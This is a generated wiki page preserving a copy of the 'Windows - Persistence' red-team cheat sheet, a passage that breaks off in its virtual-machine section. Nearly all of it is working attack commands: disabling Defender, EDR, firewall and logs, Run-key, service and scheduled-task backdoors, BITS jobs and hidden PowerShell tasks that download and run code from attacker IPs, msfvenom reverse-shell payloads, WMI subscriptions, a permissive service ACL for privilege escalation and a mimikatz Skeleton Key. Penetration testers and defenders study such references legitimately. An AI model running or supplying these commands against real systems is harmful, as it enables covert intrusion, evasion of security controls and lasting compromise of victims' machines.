---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - Persistence

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-persistence-windows-persistence` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/windows-persistence.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - Persistence](../../topics/redteam/windows-persistence.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-persistence-windows-persistence |
| name | Windows - Persistence |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/persistence/windows-persistence.md |

## Preserved Source Material

````yaml
_body: "# Windows - Persistence\n\n## Summary\n\n* [Tools](#tools)\n* [Hide Your Binary](#hide-your-binary)\n* [Disable Antivirus\
  \ and Security](#disable-antivirus-and-security)\n    * [Antivirus Removal](#antivirus-removal)\n    * [Disable Windows\
  \ Defender](#disable-windows-defender)\n    * [Disable Windows Firewall](#disable-windows-firewall)\n    * [Clear System\
  \ and Security Logs](#clear-system-and-security-logs)\n* [Simple User](#simple-user)\n    * [Registry HKCU](#registry-hkcu)\n\
  \    * [Startup](#startup)\n    * [Scheduled Tasks User](#scheduled-tasks-user)\n    * [BITS Jobs](#bits-jobs)\n* [Serviceland](#serviceland)\n\
  \    * [IIS](#iis)\n    * [Windows Service](#windows-service)\n* [Elevated](#elevated)\n    * [Registry HKLM](#registry-hklm)\n\
  \        * [Winlogon Helper DLL](#winlogon-helper-dll)\n        * [GlobalFlag](#globalflag)\n    * [Startup Elevated](#startup-elevated)\n\
  \    * [Services Elevated](#services-elevated)\n    * [Service Security Descriptor](#servicesecuritydescriptor)\n    * [Scheduled\
  \ Tasks Elevated](#scheduled-tasks-elevated)\n    * [Binary Replacement](#binary-replacement)\n        * [Binary Replacement\
  \ on Windows XP+](#binary-replacement-on-windows-xp)\n        * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)\n\
  \    * [Skeleton Key](#skeleton-key)\n    * [Virtual Machines](#virtual-machines)\n    * [Windows Subsystem for Linux](#windows-subsystem-for-linux)\n\
  * [Domain](#domain)\n    * [Golden Certificate](#golden-certificate)\n    * [Golden Ticket](#golden-ticket)\n* [References](#references)\n\
  \n## Tools\n\n* [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)\n\
  \n## Hide Your Binary\n\n> Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must\
  \ clear the attribute before you can change any other attributes for the file.\n\n```ps1\nPS> attrib +h mimikatz.exe\n```\n\
  \n## Disable Antivirus and Security\n\n### Antivirus Removal\n\n* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)\n\
  * [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)\n\
  * [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)\n\n    ```ps1\n   \
  \ cd \"C:\\Program Files\\Elastic\\Agent\\\"\n    PS C:\\Program Files\\Elastic\\Agent> .\\elastic-agent.exe uninstall\n\
  \    Elastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y\n\
  \    Elastic Agent has been uninstalled.\n    ```\n\n* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)\n\
  \n    ```ps1\n    # Global uninstall password: Password1\n    Password hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\\
  Persistence\\agent_settings.db\n    Look for PasswordHash, PasswordSalt or password, salt strings.\n\n    # Disable Cortex:\
  \ Change the DLL to a random value, then REBOOT\n    reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\\
  Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f\n\n    # Disables the agent on startup (requires reboot to work)\n\
  \    cytool.exe startup disable\n\n    # Disables protection on Cortex XDR files, processes, registry and services\n   \
  \ cytool.exe protect disable\n\n    # Disables Cortex XDR (Even with tamper protection enabled)\n    cytool.exe runtime\
  \ disable\n\n    # Disables event collection\n    cytool.exe event_collection disable\n    ```\n\n### Disable Windows Defender\n\
  \n```powershell\n# Disable Defender\nsc config WinDefend start= disabled\nsc stop WinDefend\nSet-MpPreference -DisableRealtimeMonitoring\
  \ $true\n\n## Exclude a process / location\nSet-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\"\nAdd-MpPreference\
  \ -ExclusionProcess 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\nAdd-MpPreference -ExclusionPath C:\\\
  Video, C:\\install\n\n# Disable scanning all downloaded files and attachments, disable AMSI (reactive)\nPS C:\\> Set-MpPreference\
  \ -DisableRealtimeMonitoring $true; Get-MpComputerStatus\nPS C:\\> Set-MpPreference -DisableIOAVProtection $true\n# Disable\
  \ AMSI (set to 0 to enable)\nPS C:\\> Set-MpPreference -DisableScriptScanning 1 \n\n# Blind ETW Windows Defender: zero out\
  \ registry values corresponding to its ETW sessions\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\\
  DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\n\n# Wipe currently stored definitions\n# Location of MpCmdRun.exe:\
  \ C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\<antimalware platform version>\nMpCmdRun.exe -RemoveDefinitions\
  \ -All\n\n# Remove signatures (if Internet connection is present, they will be downloaded again):\nPS > & \"C:\\ProgramData\\\
  Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\nPS > & \"C:\\Program Files\\\
  Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n\n# Disable Windows Defender Security Center\nreg add \"HKLM\\\
  System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f\n\n# Disable Real Time\
  \ Protection\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg add \"HKLM\\Software\\Policies\\\
  Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\\
  Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\n```\n\n### Disable Windows Firewall\n\n```powershell\n\
  Netsh Advfirewall show allprofiles\nNetSh Advfirewall set allprofiles state off\n\n# ip whitelisting\nNew-NetFirewallRule\
  \ -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY\
  \ -RemoteAddress ATTACKER_IP\n```\n\n### Clear System and Security Logs\n\n```powershell\ncmd.exe /c wevtutil.exe cl System\n\
  cmd.exe /c wevtutil.exe cl Security\n```\n\n## Simple User\n\nSet a file as hidden\n\n```powershell\nattrib +h c:\\autoexec.bat\n\
  ```\n\n### Registry HKCU\n\nCreate a `REG_SZ` value in the `Run` key within `HKCU\\Software\\Microsoft\\Windows`.\n\n```powershell\n\
  Value name:  Backdoor\nValue data:  C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\n```\n\n* Using the command line\n\
  \n    ```powershell\n    reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ\
  \ /d \"C:\\Users\\user\\backdoor.exe\"\n    reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\\
  RunOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\n    reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\\
  Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\n    reg add \"HKEY_CURRENT_USER\\\
  Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\n\
  \    ```\n\n* Using [mandiant/SharPersist](https://github.com/mandiant/SharPersist)\n\n    ```powershell\n    SharPersist\
  \ -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add\n    SharPersist\
  \ -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env\n    SharPersist\
  \ -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add\n    ```\n\n#### Persistence\
  \ via NTUSER.MAN\n\nDirectly modifying `HKCU` for persistence (e.g., `Run` keys) is noisy and commonly detected by modern\
  \ EDR solutions. A lesser-known alternative is to pre-seed the user’s registry hive offline by abusing `NTUSER.MAN`, which\
  \ Windows treats as a mandatory profile.\n\nWhen a user logs in, Windows loads their registry hive from disk. If an `NTUSER.MAN`\
  \ file is present instead of (or alongside) `NTUSER.DAT`, Windows loads the hive as read-only and applies its contents verbatim—without\
  \ generating the usual registry modification telemetry.\n\nInstead of editing the live registry:\n\n1. Export the target\
  \ user’s `HKCU` hive\n\n   * Via `reg export HKCU exported.reg`\n   * Using a BOF-based approach to avoid spawning `reg.exe`.\n\
  \n2. Modify the exported registry data offline\n\n   * Add or change persistence mechanisms (e.g., `Run` keys).\n\n3. Convert\
  \ the modified `.reg` file into a binary hive\n\n   * Use [praetorian-inc/swarmer](https://github.com/praetorian-inc/swarmer)\
  \ to generate a valid `NTUSER.MAN`.\n\n4. Drop the resulting `NTUSER.MAN` into the user’s profile directory\n\n   * `%USERPROFILE%\\\
  NTUSER.MAN`\n\nExample:\n\n```powershell\nswarmer.exe --startup-key \"Updater\" --startup-value \"C:\\Path\\To\\payload.exe\"\
  \ exported.reg NTUSER.MAN\n```\n\nOn the next logon, Windows loads this hive automatically, establishing persistence without\
  \ touching the live registry.\n\n**Mandatory profile side effects**\nCreating an `NTUSER.MAN` converts the user profile\
  \ into a mandatory profile. Any registry or profile changes made during the session are discarded at logoff and will not\
  \ persist across logins.\n\n**Immutability without elevation**\nOnce deployed, the hive is effectively immutable. Modifying\
  \ or removing the persistence requires deleting `NTUSER.MAN`, which typically necessitates administrative privileges.\n\n\
  **Login-time loading only**\nThe hive is loaded exclusively during user logon. Changes to `NTUSER.MAN` have no effect until\
  \ the user fully logs out and logs back in.\n\n**Limited scope**\nThis technique applies only to the user registry hive\
  \ (HKCU). It does not impact machine-wide settings (HKLM) and provides per-user persistence only.\n\n### Startup\n\nCreate\
  \ a batch script in the user startup folder: `%AppData%`\n\n```powershell\nPS C:\\> gc C:\\Users\\Username\\AppData\\Roaming\\\
  Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat\nstart /b C:\\Users\\Username\\AppData\\Local\\Temp\\backdoor.exe\n\
  ```\n\nUsing SharPersist\n\n```powershell\nSharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\"\
  \ -f \"Some File\" -m add\n```\n\n### Scheduled Tasks User\n\n* Using native **schtask** - Create a new task\n\n    ```powershell\n\
  \    # Create the scheduled tasks to run once at 00.00\n    schtasks /create /sc ONCE /st 00:00 /tn \"Device-Synchronize\"\
  \ /tr C:\\Temp\\revshell.exe\n    # Force run it now !\n    schtasks /run /tn \"Device-Synchronize\"\n    ```\n\n* Using\
  \ native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks\n\n    ```powershell\n\
  \    # Launch an executable by calling the ShellExec_RunDLL function.\n    SCHTASKS /Change /tn \"\\Microsoft\\Windows\\\
  PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\\
  system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE\n    ```\n\n* Using Powershell\n\n\
  \    ```powershell\n    PS C:\\> $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\Users\\Rasta\\AppData\\\
  Local\\Temp\\backdoor.exe\"\n    PS C:\\> $T = New-ScheduledTaskTrigger -AtLogOn -User \"Rasta\"\n    PS C:\\> $P = New-ScheduledTaskPrincipal\
  \ \"Rasta\"\n    PS C:\\> $S = New-ScheduledTaskSettingsSet\n    PS C:\\> $D = New-ScheduledTask -Action $A -Trigger $T\
  \ -Principal $P -Settings $S\n    PS C:\\> Register-ScheduledTask Backdoor -InputObject $D\n    ```\n\n* Using SharPersist\n\
  \n    ```powershell\n    # Add to a current scheduled task\n    SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\\
  cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\n\n    # Add new task\n    SharPersist -t schtask -c \"C:\\Windows\\\
  System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\n    SharPersist -t schtask -c \"C:\\Windows\\System32\\\
  cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\n    ```\n\n### BITS Jobs\n\n```powershell\nbitsadmin /create\
  \ backdoor\nbitsadmin /addfile backdoor \"http://10.10.10.10/evil.exe\"  \"C:\\tmp\\evil.exe\"\n\n# v1\nbitsadmin /SetNotifyCmdLine\
  \ backdoor C:\\tmp\\evil.exe NUL\nbitsadmin /SetMinRetryDelay \"backdoor\" 60\nbitsadmin /resume backdoor\n\n# v2 - exploit/multi/script/web_delivery\n\
  bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\"\nbitsadmin\
  \ /resume backdoor\n```\n\n### COM TypeLib\n\n* [CICADA8-Research/TypeLibWalker](https://github.com/CICADA8-Research/TypeLibWalker)\
  \ - TypeLib persistence technique\n\nUse [sysinternals/procmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procmon)\
  \ to find `RegOpenKey` with the status `NAME NOT FOUND`. The process `explorer.exe` is a good target, as it will spawn your\
  \ payload every time it is run.\n\n```ps1\nPath: HKCU\\Software\\Classes\\TypeLib\\{CLSID}\\1.1\\0\\win32\nPath: HKCU\\\
  Software\\Classes\\TypeLib\\{CLSID}\\1.1\\0\\win64\nName: anything\nType: REG_SZ\nValue: script:C:\\1.sct\n```\n\nExample\
  \ of content for `1.sct`.\n\n```xml\n<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"explorer\"\
  \n        progid=\"explorer\"\n        version=\"1.0\"\n        classid=\"{66666666-6666-6666-6666-666666666666}\"\n   \
  \     remotable=\"true\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell\
  \ = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"calc.exe\");\n        ]]>\n    </script>\n</scriptlet>\n\
  ```\n\n## Serviceland\n\n### IIS\n\nIIS Raid – Backdooring IIS Using Native Modules\n\n```powershell\n$ git clone https://github.com/0x09AL/IIS-Raid\n\
  $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS\nC:\\Windows\\system32\\inetsrv\\APPCMD.EXE\
  \ install module /name:Module Name /image:\"%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\" /add:true\n```\n\n### Windows\
  \ Service\n\nUsing SharPersist\n\n```powershell\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\"\
  \ -n \"Some Service\" -m add\n```\n\n## Elevated\n\n### Registry HKLM\n\nSimilar to HKCU. Create a REG_SZ value in the Run\
  \ key within HKLM\\Software\\Microsoft\\Windows.\n\n```powershell\nValue name:  Backdoor\nValue data:  C:\\Windows\\Temp\\\
  backdoor.exe\n```\n\nUsing the command line\n\n```powershell\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\\
  CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\\
  Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\\
  Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\\
  Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\n```\n\n\
  #### Winlogon Helper DLL\n\n> Run executable during Windows logon\n\n```powershell\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444\
  \ -f dll > evilbinary.dll\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d\
  \ \"Userinit.exe, evilbinary.exe\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell\
  \ /d \"explorer.exe, evilbinary.exe\" /f\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
  \" \"Userinit\" \"Userinit.exe, evilbinary.exe\" -Force\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\\
  Winlogon\\\" \"Shell\" \"explorer.exe, evilbinary.exe\" -Force\n```\n\n#### GlobalFlag\n\n> Run executable after notepad\
  \ is killed\n\n```powershell\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\
  notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\
  notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\
  notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n```\n\n### Startup Elevated\n\nCreate a batch script in the `ProgramData`\
  \ startup folder.\n\n```powershell\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp \n```\n\n### Services\
  \ Elevated\n\nCreate a service that will start automatically or on-demand.\n\n```powershell\n# Powershell\nNew-Service -Name\
  \ \"Backdoor\" -BinaryPathName \"C:\\Windows\\Temp\\backdoor.exe\" -Description \"Nothing to see here.\" -StartupType Automatic\n\
  sc start Backdoor\n\n# SharPersist\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c backdoor.exe\"\
  \ -n \"Backdoor\" -m add\n\n# sc\nsc create Backdoor binpath= \"cmd.exe /k C:\\temp\\backdoor.exe\" start=\"auto\" obj=\"\
  LocalSystem\"\nsc start Backdoor\n```\n\n### ServiceSecurityDescriptor\n\nAllow any arbitrary non-administrative user to\
  \ have full SYSTEM permissions on a machine persistently by feeding an overly permissive ACL to the service control manager\
  \ with sdset.\n\n**Exploit**:\n\n```ps1\nsc.exe sdset <ServiceName> <ServiceSecurityDescriptor>\n```\n\nThe following command\
  \ grants full control (`Key Access`) over the Service Control Manager to all users (represented by `WD`, which stands for\
  \ \"World\"). In other words, it allows any user to start, stop, modify, or control services through the Service Control\
  \ Manager, which can be a security risk as it opens service management to everyone on the system.\n\n```ps1\nsc.exe sdset\
  \ scmanager D:(A;;KA;;;WD)\n```\n\n* `sc.exe`: The Service Control (sc) command is a Windows utility used for managing services.\n\
  * `sdset`: This option sets a Security Descriptor (SD) for a service or the Service Control Manager itself. A security descriptor\
  \ defines permissions and access rights to system resources.\n* `scmanager`: This is the target, referring to the Service\
  \ Control Manager, which manages the services in the system.\n\nThe `ServiceSecurityDescriptor` is defined using the Service\
  \ Descriptor Definition Language (SDDL).\n\nList the permissions for `scmanager`\n\n```ps1\nsc.exe sdshow scmanager\n```\n\
  \nAlternatively, you can use [zacateras/sddl-parser](https://github.com/zacateras/sddl-parser) to understand the Security\
  \ Descriptor Definition Language (SDDL), e.g: `./Sddl.Parser.Console.exe \"O:BAG:BAD:(A;CI;CCDCRP;;;NS)\"`.\n\nAbuse the\
  \ weaken configuration to create a service that grants administrator privilege to a custom user `user_basic`.\n\n```ps1\n\
  sc create LPE displayName= \"LPE\" binPath= \"C:\\Windows\\System32\\net.exe localgroup Administrators user_basic /add\"\
  \ start= auto\n```\n\nThen you need to wait for a reboot for the service to automatically start and grant the user with\
  \ elevated privilege or any persistence mechanism you specified in the `binPath`.\n\n### Scheduled Tasks Elevated\n\nScheduled\
  \ Task to run as SYSTEM, everyday at 9am or on a specific day.\n\n> Processes spawned as scheduled tasks have taskeng.exe\
  \ process as their parent\n\n```powershell\n# Powershell\n$A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"\
  /c C:\\temp\\backdoor.exe\"\n$T = New-ScheduledTaskTrigger -Daily -At 9am\n# OR\n$T = New-ScheduledTaskTrigger -Daily -At\
  \ \"9/30/2020 11:05:00 AM\"\n$P = New-ScheduledTaskPrincipal \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest\n$S = New-ScheduledTaskSettingsSet\n\
  $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S\nRegister-ScheduledTask \"Backdoor\" -InputObject\
  \ $D\n\n# Native schtasks\nschtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr C:\\tools\\shell.cmd /ru \"SYSTEM\"\n\
  schtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr calc /ru \"SYSTEM\" /s dc-mantvydas /u user /p password\nschtasks\
  \ /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn [TaskName] /tr \"regsvr32.exe -s \\\"C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\
  \"\" /SC ONCE /Z /ST [Time] /ET [Time]\n\n##(X86) - On User Login\nschtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\\
  system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object\
  \ net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System\n \n##(X86) - On\
  \ System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\
  \ -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\"\
  \ /sc onstart /ru System\n \n##(X86) - On User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\\
  WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object\
  \ net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n \n##(X64) - On User Login\n\
  schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden\
  \ -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\"\
  \ /sc onlogon /ru System\n \n##(X64) - On System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\\
  WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object\
  \ net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System\n \n##(X64) - On\
  \ User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\
  \ -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\"\
  \ /sc onidle /i 30\n```\n\n### Windows Management Instrumentation Event Subscription\n\n> An adversary can use Windows Management\
  \ Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event\
  \ occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event\
  \ occurs, providing persistence on a system.\n\n* **__EventFilter**: Trigger (new process, failed logon etc.)\n* **EventConsumer**:\
  \ Perform Action (execute payload etc.)\n* **__FilterToConsumerBinding**: Binds Filter and Consumer Classes\n\n```ps1\n\
  # Using CMD : Execute a binary 60 seconds after Windows started\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter\
  \ CREATE Name=\"WMIPersist\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent\
  \ WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\nwmic /NAMESPACE:\"\\\\root\\subscription\"\
  \ PATH CommandLineEventConsumer CREATE Name=\"WMIPersist\", ExecutablePath=\"C:\\Windows\\System32\\binary.exe\",CommandLineTemplate=\"\
  C:\\Windows\\System32\\binary.exe\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"\
  __EventFilter.Name=\\\"WMIPersist\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WMIPersist\\\"\"\n# Remove it\nGet-WMIObject\
  \ -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='WMIPersist'\" | Remove-WmiObject -Verbose\n\n# Using\
  \ Powershell (deploy)\n$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"\
  SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND\
  \ TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90\"};\n$Filter=New-CimInstance -Namespace root/subscription\
  \ -ClassName __EventFilter -Property $FilterArgs\n$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate=\"$($Env:SystemRoot)\\\
  System32\\binary.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property\
  \ $ConsumerArgs\n$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}\n$FilterToConsumerBinding\
  \ = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n\
  # Using Powershell (remove)\n$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer\
  \ -Filter \"Name = 'WMIPersist'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter\
  \ -Filter \"Name = 'WMIPersist'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"\
  REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\"\n$FilterConsumerBindingToCleanup\
  \ | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n```\n\n### Binary\
  \ Replacement\n\n#### Binary Replacement on Windows XP+\n\n| Feature             | Executable                          \
  \  |\n|---------------------|---------------------------------------|\n| Sticky Keys         | C:\\Windows\\System32\\sethc.exe\
  \         |\n| Accessibility Menu  | C:\\Windows\\System32\\utilman.exe       |\n| On-Screen Keyboard  | C:\\Windows\\System32\\\
  osk.exe           |\n| Magnifier           | C:\\Windows\\System32\\Magnify.exe       |\n| Narrator            | C:\\Windows\\\
  System32\\Narrator.exe      |\n| Display Switcher    | C:\\Windows\\System32\\DisplaySwitch.exe |\n| App Switcher      \
  \  | C:\\Windows\\System32\\AtBroker.exe      |\n\nIn Metasploit : `use post/windows/manage/sticky_keys`\n\n#### Binary\
  \ Replacement on Windows 10+\n\nExploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable.\n\
  \nCreate a malicious **HID.dll** in  `C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll`.\n\n### Skeleton\
  \ Key\n\n> Inject a master password into the LSASS process of a Domain Controller.\n\n**Requirements**:\n\n* Domain Administrator\
  \ (SeDebugPrivilege) or `NTAUTHORITY\\SYSTEM`\n\n**Exploitation**:\n\n```powershell\n# Execute the skeleton key attack\n\
  mimikatz \"privilege::debug\" \"misc::skeleton\"\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName\
  \ <DCs FQDN>\n\n# Access using the password \"mimikatz\"\nEnter-PSSession -ComputerName <AnyMachineYouLike> -Credential\
  \ <Domain>\\Administrator\n```\n\n### Virtual Machines\n\n> Based on the Shadow Bunny technique.\n\n```ps1\n# download virtualbox\n\
  Invoke-WebRequest \"https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\" -OutFile $env:TEMP\\\
  VirtualBox-6.1.8-137981-Win.exe\n\n# perform a silent install and avoid creating desktop and quick launch icons\nVirtualBox-6.0.14-133895-Win.exe\
  \ --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0\n\n# in \\Program\
